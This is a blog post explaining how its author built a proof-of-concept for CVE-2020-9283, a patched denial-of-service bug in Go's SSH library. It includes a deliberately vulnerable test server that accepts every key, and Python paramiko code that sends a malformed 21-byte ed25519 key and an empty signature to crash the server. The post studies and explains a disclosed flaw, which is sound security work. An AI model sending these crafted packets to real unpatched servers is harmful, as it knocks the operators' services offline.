---
layout: post
title:  "Writing a PoC for a Denial of Service in Go's SSH library (CVE-2020-9283)"
date:   2020-02-21 12:44:00 -0600
categories: security
---

# The vulnerability

On February 20th, 2020, the Go team [announced](https://groups.google.com/g/golang-announce/c/3L45YRc91SY) a new denial-of-service vulnerability had been patched in the [golang/x/crypto](https://github.com/golang/crypto) library:

> Version v0.0.0-20200220183623-bac4c82f6975 of golang.org/x/crypto fixes a vulnerability in the golang.org/x/crypto/ssh package which allowed peers to cause a panic in SSH servers that accept public keys and in any SSH client.
>
> An attacker can craft an ssh-ed25519 or sk-ssh-...@openssh.com public key, such that the library will panic when trying to verify a signature with it. Clients can deliver such a public key and signature to any golang.org/x/crypto/ssh server with a PublicKeyCallback, and servers can deliver them to any golang.org/x/crypto/ssh client.
>
> This issue was discovered and reported by Alex Gaynor, Fish in a Barrel, and is tracked as CVE-2020-9283.

This issue seemed super interesting to me since I've spent a good amount of time hacking away at Go-based SSH servers during my career so I decided to take a stab at reverse engineering the patch to see if I could construct a working proof-of-concept (PoC) script for the vulnerability.

# The fix

As mentioned in the initial announcement, the commit that fixed the issue was [bac4c82f6975](https://github.com/golang/crypto/commit/bac4c82f69751a6dd76e702d54b3ceb88adab236) so I started my search there. As it turns out the changeset was pretty small (only 23 lines were changed; all in the same file).

Most of the changes centered around checking the length of an ed25519 keys to ensure that the provided key's length was equal to the expected length for an ed25519 key (32 bytes). That seems to indicate that the way to cause a panic is simply to send a SSH public key that is shorter than 32 bytes. That sounds like something that shouldn't be too hard to do.

# Building a test environment

In order to test the PoC, I needed to build an SSH server using the vulnerable version of the library. This was actually pretty simple thanks to golang.org/x/crypto/ssh.

```
package main

import (
	"log"
	"net"

	"golang.org/x/crypto/ssh"
)

// static host key (don't use in production)
var hostKey = []byte(`
-----BEGIN OPENSSH PRIVATE KEY-----
...
-----END OPENSSH PRIVATE KEY-----
`)

func handleConnection(nConn net.Conn, config *ssh.ServerConfig) {
	conn, chans, reqs, err := ssh.NewServerConn(nConn, config)
	if err != nil {
		log.Printf("failed to handshake: %s", err)
		return
	}
	defer conn.Close()
	log.Printf("user authenticated successfully from %s", nConn.RemoteAddr().String())

	go ssh.DiscardRequests(reqs)

	for newChannel := range chans {
		if newChannel.ChannelType() != "session" {
			newChannel.Reject(ssh.UnknownChannelType, "unknown channel type")
			continue
		}
		channel, _, err := newChannel.Accept()
		if err != nil {
			log.Printf("Could not accept channel: %v", err)
			continue
		}

		channel.Close()
	}
}

func main() {
	config := &ssh.ServerConfig{
		PublicKeyCallback: func(conn ssh.ConnMetadata, key ssh.PublicKey) (*ssh.Permissions, error) {
			// every public key is accepted (not for production use)
			return nil, nil
		},
	}

	private, err := ssh.ParsePrivateKey(hostKey)
	if err != nil {
		log.Fatal("Failed to parse host private key: ", err)
	}

	config.AddHostKey(private)

	log.Printf("Vulnerable SSH server running on 0.0.0.0:2022")
	listener, err := net.Listen("tcp", "0.0.0.0:2022")
	if err != nil {
		log.Fatal("failed to listen for connection: ", err)
	}
	for {
		nConn, err := listener.Accept()
		if err != nil {
			log.Fatal("failed to accept incoming connection: ", err)
		}

		go handleConnection(nConn, config)
	}
}
```

All this server does is listen for SSH connections on port 2022 using public key authentication. For our purposes, we don't really care about the value of the key so we simply set PublicKeyCallback to return `nil` to blindly accept any key that we're given. `PublicKeyCallback`'s second argument is `ssh.PublicKey` so its likely we will have already triggered our `panic` by this point anyways since that would require parsing the key and possibly validating the signature.

In order to ensure we're running the vulnerable version of `golang.org/x/crypto`, we also need to include a `go.mod` file that pins the library at the appropriate version:

```
module github.com/mark-adams/exploits/CVE-2020-9283/target-vulnerable

go 1.13

require golang.org/x/crypto v0.0.0-20200219234226-1ad67e1f0ef4
```

Now we can run a quick test to make sure we have a working SSH server:

```
$ go run .
2020/12/15 10:37:22 Vulnerable SSH server running on 0.0.0.0:2022
```

and now we generate a test public key and trigger an example connection:

```
$ ssh-keygen -b 2048 -t rsa -f testkey -q -N ""
$ ssh localhost -i testkey -p 2022
Connection to localhost closed.
```

and if we look back at our server logs, we see:

```
2020/12/15 10:40:17 user authenticated successfully from [::1]:51537
```

Neat. It looks like we have a working SSH server. 🎉

# The SSH Protocol

The SSH protocol is defined in a bunch of different IETF RFCs. In our case the two primary ones that we are interested in are:

* RFC 4253: The Secure Shell (SSH) Transport Layer Protocol; and
* RFC 4252: The Secure Shell (SSH) Authentication Protocol

As informative as reading the RFCs can be, it is often more useful to simply look at verbose output from a sample connection and see what we can learn from that. To get the sort of verbosity we're looking for, running a command like `$ ssh localhost -i testkey -p 2022 -vvv` should suffice.

Doing so gives us some insight into how the SSH protocol is put together.

## Key Exchange
One of the first things we see in the output is

```
debug3: send packet: type 20
debug1: SSH2_MSG_KEXINIT sent
debug3: receive packet: type 20
debug1: SSH2_MSG_KEXINIT received
```

These SSH_MSG_KEXINIT messages being exchanged between the client and server (described in [RFC 4253 7.1](https://tools.ietf.org/html/rfc4253#section-7.1)) kick off the key exchange process and help the client and server agree on which algorithms make sense for conducting the rest of the handshake.

Next up, we see a couple other messages:

```
debug3: send packet: type 30
debug1: expecting SSH2_MSG_KEX_ECDH_REPLY
debug3: receive packet: type 31
```

These messages are part of the key exchange process and help the server and client establish a shared secret with each other. These are defined in [RFC 5656 7.1](https://tools.ietf.org/html/rfc5656#section-7.1).

```
debug3: send packet: type 21
debug2: set_newkeys: mode 1
debug1: rekey out after 134217728 blocks
debug1: SSH2_MSG_NEWKEYS sent
debug1: expecting SSH2_MSG_NEWKEYS
debug3: receive packet: type 21
debug1: SSH2_MSG_NEWKEYS received
debug2: set_newkeys: mode 0
debug1: rekey in after 134217728 blocks
```

These messages wrap up the key exchange process and are defined in [RFC 4253 7.3](https://www.ietf.org/rfc/rfc4253.html#section-7.3).

## User Authentication

As interesting as key exchange is, we are looking for the point in the handshake where we send our public key to the server so we can replace it with a specially crafted key designed to cause the panic.

Next up in the logs, we see something more interesting:

```
debug1: Will attempt key: testkey RSA SHA256:C1kVTeLCnNvKTX1Jl9UUKrJ5D1leqZRC6LgKnyzxPxE explicit
debug2: pubkey_prepare: done
debug3: send packet: type 5
debug3: receive packet: type 6
debug2: service_accept: ssh-userauth
debug1: SSH2_MSG_SERVICE_ACCEPT received
debug3: send packet: type 50
debug3: receive packet: type 51
debug1: Authentications that can continue: publickey
debug3: start over, passed a different list publickey
debug3: preferred publickey,keyboard-interactive,password
debug3: authmethod_lookup publickey
debug3: remaining preferred: keyboard-interactive,password
debug3: authmethod_is_enabled publickey
debug1: Next authentication method: publickey
debug1: Offering public key: testkey RSA SHA256:C1kVTeLCnNvKTX1Jl9UUKrJ5D1leqZRC6LgKnyzxPxE explicit
debug3: send packet: type 50
debug2: we sent a publickey packet, wait for reply
debug3: receive packet: type 60
debug1: Server accepts key: testkey RSA SHA256:C1kVTeLCnNvKTX1Jl9UUKrJ5D1leqZRC6LgKnyzxPxE explicit
debug3: sign_and_send_pubkey: RSA SHA256:C1kVTeLCnNvKTX1Jl9UUKrJ5D1leqZRC6LgKnyzxPxE
debug3: sign_and_send_pubkey: signing using ssh-rsa
debug3: send packet: type 50
debug3: receive packet: type 52
debug1: Authentication succeeded (publickey).
```

You see a couple things happening here:
* `send packet: type 5` (SSH_MSG_SERVICE_REQUEST) is sent by the client
* `receive packet: type 6` (SSH_MSG_SERVICE_ACCEPT) is received by the client
* `service_accept: ssh-userauth`

These entries in our output indicate that we've now entered the user authentication phase of the handshake.

Now we see:
* `send packet: type 50` (SSH_MSG_USERAUTH_REQUEST)
* `receive packet: type 51` (SSH_MSG_USERAUTH_FAILURE)
* `Authentications that can continue: publickey`

These messages are defined in [RFC 4252](https://tools.ietf.org/html/rfc4252#section-5) and allow the SSH client to determine which authentication methods are valid for the specified user on the remote server. The `SSH_MSG_USERAUTH_FAILURE` message includes a list of those fields in it's response so that the client only needs to try authentication methods that are valid for the specified user.

Next up we see:
* `send packet: type 50` (SSH_MSG_USERAUTH_REQUEST) is sent by the client
* `receive packet: type 60` (SSH_MSG_USERAUTH_PK_OK) is sent by the server
* `Server accepts key: ...`

Wow! A lot of exciting stuff happened there that looks pretty interesting for those of us looking to send a maliciously crafted public key to a remote server. Let's dive in!

We can infer from the server's reply with an `SSH_MSG_USERAUTH_PK_OK` message that the `SSH_MSG_USERAUTH_REQUEST` was the client's attempt to send the username of the user and the user's public key to the server to see if the server will accept it. The server's reply is the server's way of saying "Yes, I will accept that key for authenticating that user if you can prove you have the private key".

The next `SSH_MSG_USERAUTH_REQUEST` sent by the client is actually very similar to the first one except the end of the message also contains a signature performed on a set of connection-related information which proves the client actually possesses the private key. The method for constructing these messages and the corresponding signature are detailed in [RFC 4252 Section 7](https://www.ietf.org/rfc/rfc4252.html#section-7).

Since the server possesses the same information that was signed by the client, it is able to use the public key to decrypt the signature from the second `SSH_MSG_USERAUTH_REQUEST` message to validate that the client possesses the public key.

This is actually the breakthrough that we've been looking for. At this stage in the handshake, the server has taken the public key provided by the client, parsed it, and is actually attempting to use it to validate the signature sent by the client.

# Setting up a connection

There are a couple different ways to go about creating an SSH connection and getting us to the stage where we could send our malicious public key to the server.

Using most existing SSH frameworks (like `golang.org/x/crypto/ssh`) likely won't work well since these libraries are an abstraction over the underlying protocol and don't give us the ability to send raw `SSH_MSG_USERAUTH_REQUEST` messages when we need to.

We could write our own SSH handshake implementation but that seems like a lot of work that it would be nice to avoid if we can.

Luckily for us, there is a reasonable compromise. The [paramiko](https://www.paramiko.org/) Python library provides a nice balance between handling some of the messy parts for us (like key exchange) while also letting us send raw SSH packets when we need to.

Installing `paramiko` is easy and just involves a simple `pip install paramiko`. Once that is out of the way, we can construct a simple SSH client script:

```
import socket
import paramiko

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host, port))

t = paramiko.Transport(sock)
t.start_client()
```

In the first part of our script, we open a TCP socket to the host / port of our SSH server. We then pass that socket to a new `paramiko.Transport` instance and call the `start_client()` method. This triggers the first part of the SSH handshake (Key Exchange) detailed earlier in this post. This will put us in a perfect spot for us to proceed with the next phase (user authentication) and send our malicious key.

# Authenticating with Paramiko

Before we can send a malicious SSH key, we need to find how to send arbitrary SSH protocol messages with `paramiko`. Luckily, `paramiko` has a `paramiko.Message` class perfect for constructing SSH protocol messages and the `paramiko.Transport` has a `._send_message()` method which will drop that message onto the socket.

Now we can construct a slightly simplified version of the authentication flow to skip quickly to the part where we get the server to parse our key:

1. Send a `SSH_MSG_SERVICE_REQUEST` asking for `ssh-userauth` service
2. Send a `SSH_MSG_USERAUTH_REQUEST` message including our malicious public key and signature.

We're able to skip a couple of steps here for a number of reasons:
* We don't have to wait for the server to reply to our `SSH_MSG_SERVICE_REQUEST` because this is a proof of concept and the server will likely reply with `SSH_MSG_USERAUTH_FAILURE` anyways.
* We don't have to send the initial `SSH_MSG_USERAUTH_REQUEST` containing the public key but no signature because our proof-of-concept script is barebones and we don't really care about telling the person running the script that the remote user doesn't exist. Plus, for our test server, it accepts all users so we know we will succeed no matter what.

To construct the `SSH_MSG_SERVICE_REQUEST`, we just take a look at [RFC 4253](https://tools.ietf.org/html/rfc4253#section-10) and mirror that in our Python code. The spec from the RFC looks like this:

```
byte      SSH_MSG_SERVICE_REQUEST
string    service name
```

and the corresponding Python code looks like this:

```
t.lock.acquire()
m = paramiko.Message()
m.add_byte(cMSG_SERVICE_REQUEST)
m.add_string("ssh-userauth")
t._send_message(m)
```

Next, we will focus on sending the `SSH_MSG_USERAUTH_REQUEST` containing our malicious public key. These messages are specific to the authentication method that you want to use (in this case `publickey`) and are defined in [RFC 4252](https://tools.ietf.org/html/rfc4252#section-7). Once again, you'll notice that the spec for these messages is pretty similar to the code that we're writing in Python. The RFC defines the message structure as:

```
byte      SSH_MSG_USERAUTH_REQUEST
string    user name
string    service name
string    "publickey"
boolean   TRUE
string    public key algorithm name
string    public key to be used for authentication
string    signature
```

and our Python code looks like this:

```
m = paramiko.Message()
m.add_byte(cMSG_USERAUTH_REQUEST)
m.add_string(user)
m.add_string("ssh-connection")
m.add_string('publickey')
m.add_boolean(True)
m.add_string('ssh-ed25519')
```

The astute reader will note that we are missing the public key itself and the signature from our message that we are constructing. That is the next thing we are going to tackle.

# Sending the malicious key

Once again, some quick Googling tells us that the SSH public key format for ed25519 keys is defined by [RFC 8709](https://www.ietf.org/rfc/rfc8709.html#section-6) and has the following format:

```
string  "ssh-ed25519"
string  key
```

That's pretty straightforward. We know that ed25519 keys are expected to have a `key` that is 32 bytes long. For this attack, we simply want to ensure that `key` is less than 32 bytes long. We can do that with the following Python:

```
key = paramiko.Message()
key.add_string('ssh-ed25519')
key.add_string('key-that-is-too-short')
m.add_string(key.__str__())
```

Take notice that `key-that-is-too-short` is 21 bytes long and 21 < 32 which meets our requirement for the key being too short.

The final part of constructing our payload is to add the `signature` required at the end of the message. Luckily for , we're trying to get the server to `panic` while verifying the signature so we don't actually need the signature to validate. In fact, we can even put in an empty string if we want and that's exactly what we're going to do:

```
sig = paramiko.Message()
sig.add_string('ssh-ed25519')
sig.add_string('')
m.add_string(sig.__str__())
```

Now that we've composed our completed `SSH_MSG_USERAUTH_REQUEST` message we can go ahead and send it to trigger the `panic` and crash the server:

```
t._send_message(m)
```

# Did it work?

At this point, we can run back over and check our vulnerable server and see if our attack worked.

```
panic: ed25519: bad public key length: 21

goroutine 64 [running]:
crypto/ed25519.Verify(0xc000026ccf, 0x15, 0x2c, 0xc00000b600, 0x88, 0x100, 0xc000026cf7, 0x0, 0x0, 0x20)
        /usr/local/go/src/crypto/ed25519/ed25519.go:205 +0x477
golang.org/x/crypto/ed25519.Verify(...)
        /Users/User/dev/go/pkg/mod/golang.org/x/crypto@v0.0.0-20200219234226-1ad67e1f0ef4/ed25519/ed25519_go113.go:72
golang.org/x/crypto/ssh.ed25519PublicKey.Verify(0xc000026ccf, 0x15, 0x2c, 0xc00000b600, 0x88, 0x100, 0xc000072f80, 0x28, 0x3f)
        /Users/User/dev/go/pkg/mod/golang.org/x/crypto@v0.0.0-20200219234226-1ad67e1f0ef4/ssh/keys.go:587 +0x19d
golang.org/x/crypto/ssh.(*connection).serverAuthenticate(0xc000139500, 0xc00010b6c0, 0x11, 0x40, 0x0)
        /Users/User/dev/go/pkg/mod/golang.org/x/crypto@v0.0.0-20200219234226-1ad67e1f0ef4/ssh/server.go:567 +0x1624
golang.org/x/crypto/ssh.(*connection).serverHandshake(0xc000139500, 0xc00010b6c0, 0x12185fb, 0x1b, 0x13919c0)
        /Users/User/dev/go/pkg/mod/golang.org/x/crypto@v0.0.0-20200219234226-1ad67e1f0ef4/ssh/server.go:277 +0x5e7
golang.org/x/crypto/ssh.NewServerConn(0x12531e0, 0xc0000100c8, 0xc00010b040, 0x0, 0x0, 0x0, 0x0, 0x0)
        /Users/User/dev/go/pkg/mod/golang.org/x/crypto@v0.0.0-20200219234226-1ad67e1f0ef4/ssh/server.go:206 +0x18e
main.handleConnection(0x12531e0, 0xc0000100c8, 0xc00010b040)
        /Users/User/dev/exploits/CVE-2020-9283/target-vulnerable/main.go:42 +0x6a
created by main.main
        /Users/User/dev/exploits/CVE-2020-9283/target-vulnerable/main.go:93 +0x245
exit status 2
```

and sure enough, it worked! 🏆

# The fix explained

Interestingly, the `panic` is actually caused [by validation logic](https://github.com/golang/crypto/blob/master/ed25519/ed25519.go#L180-L182) in golang.org/x/crypto/ed25519 that checks to see if the key bytes are the proper length when `Verify()` is called.

The fix is actually pretty straightforward. The same validation logic is duplicated in golang.org/x/crypto/ssh such that the key length is checked prior to calling `ed25519.Verify()` and an error is returned instead of triggering the `panic` later on in the process.

# That's all folks!

Thanks for taking the time to walkthrough this vulnerability with me and construct a working proof-of-concept. If you'd like to see the whole thing, you can view it on GitHub here:

https://github.com/mark-adams/exploits/tree/master/CVE-2020-9283

